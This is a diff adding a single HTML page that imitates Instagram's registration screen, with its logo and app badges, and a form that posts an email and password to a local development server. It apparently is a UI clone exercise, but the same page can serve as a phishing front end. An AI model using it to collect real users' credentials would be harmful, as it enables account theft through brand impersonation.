@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="assets/css/main.css">
+    <title>Instagram - Registro</title>
+</head>
+<body>
+    <main class="l-main">
+        <div class="l-main__img">
+            <img src="assets/img/homepage.png" alt="Smartphones">
+        </div>
+        <div class="l-user">
+            <div class="c-panel group">
+                <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+                
+                <form action="http://127.0.0.1:5000/register" method="POST" class="c-panel__form">
+                    <input type="email" name="email" class="c-panel__input" placeholder="Correo electrónico" required>
+                    <input type="password" name="password" class="c-panel__input" placeholder="Contraseña" required>
+                    <button type="submit" class="c-btn" style="width: 100%; text-decoration: none; padding: 8px 0;">
+                        Registrarse
+                    </button>
+                </form>
+
+                <span class="c-panel__span">OR</span>
+                <a href="#" class="c-panel__facebook">Login with Facebook</a>
+                <a href="#" class="c-panel__forgot">Forgot password?</a>
+            </div>
+            <div class="c-signup group">
+                <p>Don't have an account? <span>Sign up</span></p>
+            </div>
+            <div class="c-app">
+                <p>Get the app.</p>
+                <div class="c-app__download">
+                    <img src="assets/img/apple.png" alt="Apple Store">
+                    <img src="assets/img/google.png" alt="Google Play">
+                </div>
+            </div>
+        </div>
+    </main>
+</body>
+</html>
